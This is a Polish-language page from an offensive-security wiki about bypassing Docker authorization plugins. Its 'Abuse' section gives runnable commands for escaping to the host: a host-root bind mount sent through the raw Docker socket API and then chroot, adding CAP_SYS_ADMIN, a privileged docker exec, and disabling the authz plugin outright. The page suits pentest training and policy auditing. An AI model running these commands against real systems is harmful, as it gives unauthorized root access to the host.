# Wtyczki autoryzacji środowiska uruchomieniowego

## Omówienie

Wtyczki autoryzacji środowiska uruchomieniowego stanowią dodatkową warstwę polityki, która decyduje, czy wywołujący może wykonać określoną akcję demona. Klasycznym przykładem jest Docker. Domyślnie każdy, kto może komunikować się z demonem Docker, ma w praktyce szeroką kontrolę nad nim. Wtyczki autoryzacji próbują zawęzić ten model, analizując uwierzytelnionego użytkownika i żądaną operację API, a następnie zezwalając na żądanie lub je odrzucając zgodnie z polityką.

Temat ten zasługuje na osobną stronę, ponieważ zmienia model exploitation, gdy atakujący ma już dostęp do Docker API lub do użytkownika należącego do grupy `docker`. W takich środowiskach pytanie nie brzmi już tylko: „czy mogę dotrzeć do demona?”, lecz także: „czy demon jest zabezpieczony warstwą autoryzacji, a jeśli tak, czy można ją ominąć przez nieobsługiwane endpointy, słabe parsowanie JSON lub uprawnienia do zarządzania wtyczkami?”.

## Działanie

Gdy żądanie dociera do demona Docker, podsystem autoryzacji może przekazać kontekst żądania do jednej lub kilku zainstalowanych wtyczek. Wtyczka widzi tożsamość uwierzytelnionego użytkownika, szczegóły żądania, wybrane nagłówki oraz części treści żądania lub odpowiedzi, jeśli typ zawartości jest odpowiedni. Można łączyć wiele wtyczek, a dostęp jest przyznawany tylko wtedy, gdy wszystkie wtyczki zezwolą na żądanie.

Ten model wydaje się solidny, ale jego bezpieczeństwo całkowicie zależy od tego, jak dokładnie autor polityki zrozumiał API. Wtyczka, która blokuje `docker run --privileged`, ale ignoruje `docker exec`, pomija alternatywne klucze JSON, takie jak najwyższego poziomu `Binds`, lub zezwala na administrację wtyczkami, może stworzyć fałszywe poczucie ograniczenia, jednocześnie pozostawiając otwarte bezpośrednie ścieżki eskalacji uprawnień.

## Typowe cele dla wtyczek

Ważne obszary do przeglądu polityki to:

- endpointy tworzenia kontenerów
- pola `HostConfig`, takie jak `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` oraz opcje współdzielenia namespace
- działanie `docker exec`
- endpointy zarządzania wtyczkami
- wszystkie endpointy, które mogą pośrednio wywoływać działania środowiska uruchomieniowego poza zakładanym modelem polityki

Historycznie przykłady takie jak wtyczka `authz` firmy Twistlock oraz proste wtyczki edukacyjne, takie jak `authobot`, ułatwiały analizę tego modelu, ponieważ ich pliki polityk i ścieżki kodu pokazywały, jak faktycznie implementowano mapowanie endpointów na akcje. W assessment najważniejsza jest lekcja, że autor polityki musi rozumieć cały zakres API, a nie tylko najbardziej widoczne polecenia CLI.

## Abuse

Pierwszym celem jest ustalenie, co faktycznie jest blokowane. Jeśli demon odrzuci akcję, błąd często leak nazwę wtyczki, co pomaga zidentyfikować używany mechanizm kontroli:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Jeśli potrzebujesz szerszego profilowania endpointów, przydatne są narzędzia takie jak `docker_auth_profiler`, ponieważ automatyzują powtarzalne zadanie sprawdzania, które ścieżki API i struktury JSON są rzeczywiście dozwolone przez wtyczkę.

Jeśli środowisko korzysta z niestandardowej wtyczki i możesz korzystać z API, wylicz, które pola obiektów są rzeczywiście filtrowane:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Te kontrole są istotne, ponieważ wiele błędów autoryzacji dotyczy konkretnych pól, a nie całych koncepcji. Plugin może odrzucać wzorzec CLI, nie blokując w pełni równoważnej struktury API.

### Pełny przykład: `docker exec` dodaje uprawnienia po utworzeniu kontenera

Politykę, która blokuje tworzenie uprzywilejowanych kontenerów, ale zezwala na tworzenie kontenerów bez ograniczeń oraz użycie `docker exec`, nadal można obejść:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Jeśli daemon zaakceptuje drugi krok, użytkownik odzyskał uprzywilejowany interaktywny proces wewnątrz kontenera, który autor polityki uważał za ograniczony.

### Pełny przykład: Bind Mount Through Raw API

Niektóre wadliwe polityki sprawdzają tylko jeden kształt JSON. Jeśli bind mount głównego systemu plików nie jest konsekwentnie blokowany, host nadal może zostać zamontowany:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Ta sama koncepcja może również występować w `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Skutkiem jest pełne wydostanie się do systemu plików hosta. Interesującym szczegółem jest to, że bypass wynika z niepełnego pokrycia regułami, a nie z błędu kernela.

### Pełny przykład: niesprawdzany atrybut capability

Jeśli policy zapomni filtrować atrybutu związanego z capability, attacker może utworzyć kontener, który ponownie uzyska niebezpieczną capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Gdy `CAP_SYS_ADMIN` lub podobna silna capability jest dostępna, wiele technik breakout opisanych w [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md) staje się możliwych do zastosowania.

### Pełny przykład: wyłączenie pluginu

Jeśli dozwolone są operacje zarządzania pluginami, najczystszym obejściem może być całkowite wyłączenie mechanizmu:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
To awaria polityki na poziomie control plane. Warstwa autoryzacji istnieje, ale użytkownik, którego miała ograniczać, nadal ma uprawnienia do jej wyłączenia.

## Kontrole

Te polecenia mają na celu ustalenie, czy istnieje warstwa polityk oraz czy wydaje się kompletna, czy tylko pozorna.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Co jest tutaj interesujące:

- Komunikaty odmowy zawierające nazwę pluginu potwierdzają obecność warstwy autoryzacji i często ujawniają dokładną implementację.
- Lista pluginów widoczna dla atakującego może wystarczyć do ustalenia, czy możliwe są operacje wyłączania lub rekonfiguracji.
- Politykę, która blokuje tylko oczywiste działania CLI, ale nie blokuje bezpośrednich żądań API, należy uznać za możliwą do obejścia, dopóki nie zostanie udowodnione inaczej.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne zachowanie | Częste ręczne osłabienia |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie wyłączone | Dostęp do demona jest zasadniczo całkowity albo żaden, chyba że skonfigurowano plugin autoryzacji | niekompletna polityka pluginu, blacklists zamiast allowlists, zezwalanie na zarządzanie pluginami, luki w kontroli poszczególnych pól |
| Podman | Brak powszechnego bezpośredniego odpowiednika | Podman zazwyczaj w większym stopniu opiera się na uprawnieniach Unix, wykonywaniu rootless i decyzjach dotyczących udostępniania API niż na pluginach autoryzacji w stylu Dockera | szerokie udostępnienie rootful Podman API, słabe uprawnienia do socketu |
| containerd / CRI-O | Inny model kontroli | Te runtime'y zazwyczaj opierają się na uprawnieniach do socketu, granicach zaufania węzła i kontrolach orkiestratora wyższej warstwy, a nie na pluginach autoryzacji Dockera | montowanie socketu w workloadach, słabe założenia dotyczące zaufania lokalnego dla węzła |
| Kubernetes | Używa authn/authz na warstwach API-servera i kubeleta, a nie pluginów autoryzacji Dockera | RBAC klastra i kontrole admission stanowią główną warstwę polityk | nadmiernie szerokie RBAC, słaba polityka admission, bezpośrednie udostępnianie API kubeleta lub runtime'u |

{{#include ../../../banners/hacktricks-training.md}}
